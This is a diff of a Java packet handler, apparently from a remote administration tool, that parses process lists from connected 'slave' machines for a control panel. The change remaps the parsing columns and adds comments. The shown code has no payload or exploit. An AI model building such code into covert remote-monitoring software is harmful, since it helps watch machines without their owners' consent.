@@ -19,26 +19,23 @@ public class Packet20Process extends AbstractIncomingPacket {
 			FrameControlPanel framec = FrameControlPanel.instances.get(slave);
 			String line = slave.readLine();
 			String[] displayData = new String[4];
+			
 			if (slave.getOS() == OperatingSystem.WINDOWS) {
 				line = line.replace("\"", "");
 				String[] args = line.split(",");
 
-				displayData[0] = args[0];
-				displayData[1] = args[1];
-				displayData[2] = args[2];
-				displayData[3] = args[4];
-			} else if (slave.getOS() == OperatingSystem.OSX) {
+				displayData[0] = args[0]; // name
+				displayData[1] = args[1]; // pid
+				displayData[2] = args[2]; // type / user
+				displayData[3] = args[4]; // memory usage
+			} else {
 				line = line.trim().replaceAll("( )+", " ");
 				String[] args = line.split(" ");
 
-				displayData[0] = args[3];
-				displayData[1] = args[0];
-				displayData[2] = args[2];
-				if (args.length == 5) {
-					displayData[3] = args[4];
-				} else {
-					displayData[3] = args[1];
-				}
+				displayData[0] = args[10];
+				displayData[1] = args[2];
+				displayData[2] = args[0];
+				displayData[3] = args[3];
 			}
 
 			for (int i = 0; i < displayData.length; i++) {
